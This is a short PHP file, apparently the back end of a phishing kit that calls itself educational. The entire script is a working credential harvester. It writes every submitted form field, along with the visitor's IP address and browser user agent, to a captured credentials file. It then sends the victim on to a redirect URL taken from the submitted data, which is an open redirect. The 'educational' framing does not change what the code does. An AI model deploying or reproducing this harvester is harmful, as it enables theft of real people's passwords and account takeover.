<?php
// Data capture script for educational phishing tool
// Created by: ABID MEHMOOD (The White HAT Hacker)

$log_file = '../captured_data/credentials.txt';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Create log entry
$log_entry = "\n" . str_repeat("=", 80) . "\n";
$log_entry .= "CAPTURED DATA - $timestamp\n";
$log_entry .= "IP Address: $ip\n";
$log_entry .= "User Agent: $user_agent\n";
$log_entry .= str_repeat("-", 40) . "\n";

// Capture all POST data
foreach ($_POST as $key => $value) {
    $log_entry .= "$key: $value\n";
}

$log_entry .= str_repeat("=", 80) . "\n";

// Write to log file
file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// Redirect to real site (for educational purposes)
$redirect_url = isset($_POST['redirect_url']) ? $_POST['redirect_url'] : 'https://google.com';
header("Location: $redirect_url");
exit();
?>
